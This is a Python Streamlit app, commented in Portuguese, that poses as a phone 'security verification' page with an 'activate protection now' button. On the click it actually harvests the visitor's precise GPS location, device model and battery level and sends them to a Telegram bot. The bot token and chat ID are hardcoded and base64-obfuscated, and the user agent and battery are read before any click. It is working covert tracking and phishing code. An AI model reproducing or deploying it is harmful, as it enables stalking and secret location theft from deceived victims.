import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DIRETA (Sem erro de variável) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, json={"chat_id": chat, "text": msg, "parse_mode": "Markdown"}, timeout=15)
        return True
    except:
        return False

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta dados antes do clique
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_GALAXY")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_GALAXY")

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # GATILHO DO GPS (Força o pop-up no Samsung/POCO)
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")

    if posicao and posicao != "erro":
        # 1. Identifica o Aparelho Exato
        modelo = "Smartphone"
        if ua:
            try:
                info = ua.split("(")[1].split(")")[0]
                partes = [p.strip() for p in info.split(";")]
                for p in partes:
                    if any(x in p for x in ["SM-", "POCO", "A11", "M6", "Xiaomi", "Samsung"]):
                        modelo = p
                        break
            except: modelo = "Android Device"

        # 2. Monta o Link e a Mensagem
        link = f"https://www.google.com/maps?q={posicao}"
        bateria = f"{bat}%" if bat else "OK"
        
        texto_bot = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bateria}\n"
            f"📍 *Local:* {link}"
        )
        
        # 3. Envia e dá o retorno verde
        if enviar_telegram(texto_bot):
            st.success("Proteção Ativada")
        else:
            st.error("Erro ao enviar para o bot. Verifique o Token.")
            
    elif posicao == "erro":
        st.error("Erro: GPS desligado ou acesso negado.")
    else:
        st.info("Aguardando permissão no topo da tela...")

st.markdown('<br><p style="text-align:center; color:grey; font-size:12px; font-weight:bold;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
